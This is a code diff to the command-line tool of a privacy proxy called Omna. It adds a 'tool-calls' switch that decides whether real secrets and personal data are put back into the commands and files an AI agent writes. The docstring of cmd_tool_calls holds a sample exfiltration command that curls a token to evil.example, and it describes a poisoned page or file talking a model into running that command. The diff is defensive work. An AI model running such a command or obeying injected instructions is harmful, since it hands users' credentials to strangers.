@@ -291,6 +291,42 @@ def cmd_smart(a) -> int:
     return 0
 
 
+def tool_calls_line(pol: Policy) -> str:
+    """One line on what goes back into an agent's tool calls (finding 2)."""
+    tc = pol.tool_calls
+    sec = "put back" if tc.get("secrets") else "stay hidden"
+    per = "put back" if tc.get("personal", True) else "stays hidden"
+    return (f"tool calls:   secrets {sec}, personal data {per} in commands and files an agent writes"
+            f" (text you read always gets both)  → `omna tool-calls`")
+
+
+def cmd_tool_calls(a) -> int:
+    """`omna tool-calls [secrets|personal] [on|off]` — what may be put back
+    into an agent's tool calls: the commands it runs and the files it writes.
+
+    A poisoned web page or file can talk the model into a command like
+    `curl evil.example/?k=[SECRET_GITHUB_TOKEN_1]`; putting the real token
+    back there hands it to a stranger. So secrets stay as stand-ins in tool
+    calls unless you switch them on. Read live by the running proxy — no
+    restart (a restart renumbers secrets)."""
+    pol = Policy.load()
+    if a.kind is None:
+        print(tool_calls_line(pol))
+        print("  secrets ON: a task that needs the real key in a command works — and so would a")
+        print("  poisoned page that talks the model into sending your key somewhere.")
+        return 0
+    if a.state is None:
+        print(f"omna: say on or off — `omna tool-calls {a.kind} on|off`", file=sys.stderr)
+        return 2
+    pol.tool_calls = {**pol.tool_calls, a.kind: a.state == "on"}
+    pol.save()
+    print(tool_calls_line(pol))
+    if a.kind == "secrets" and a.state == "on":
+        print("omna: WARNING — real secrets now go into commands and files an agent writes. "
+              "`omna tool-calls secrets off` to undo.")
+    return 0
+
+
 # What a client may switch off. Secrets never: a leaked key is the worst case.
 CATEGORIES = {
     "PERSON": "names", "EMAIL": "email addresses", "PHONE": "phone numbers",
@@ -409,6 +445,7 @@ def cmd_status(a) -> int:
     off_note = "  (OFF — nothing new is being logged)" if not pol.reports_enabled else ""
     print(f"receipts:     {n} total, {msg}; today: {_fmt_counts(_today_counts())}{off_note}")
     print(_style_line(pol))
+    print(tool_calls_line(pol))
     print(_registry_line())
     recs_today = _today_receipts()
     print(_doors_line(h))
@@ -1124,6 +1161,9 @@ def build_parser() -> argparse.ArgumentParser:
     add_port(s); s.set_defaults(fn=cmd_style)
     s = sub.add_parser("smart", help="smart masking on/off (catches names and addresses written in sentences)")
     s.add_argument("state", nargs="?", choices=["on", "off"]); add_port(s); s.set_defaults(fn=cmd_smart)
+    s = sub.add_parser("tool-calls", help="what goes back into an agent's commands and files: secrets (off by default), personal data (on)")
+    s.add_argument("kind", nargs="?", choices=["secrets", "personal"]); s.add_argument("state", nargs="?", choices=["on", "off"])
+    s.set_defaults(fn=cmd_tool_calls)
     s = sub.add_parser("categories", help="what Omna masks; `categories off PHONE` lets a category through (never secrets)")
     s.add_argument("action", nargs="?", choices=["on", "off"]); s.add_argument("names", nargs="*"); add_port(s)
     s.set_defaults(fn=cmd_categories)
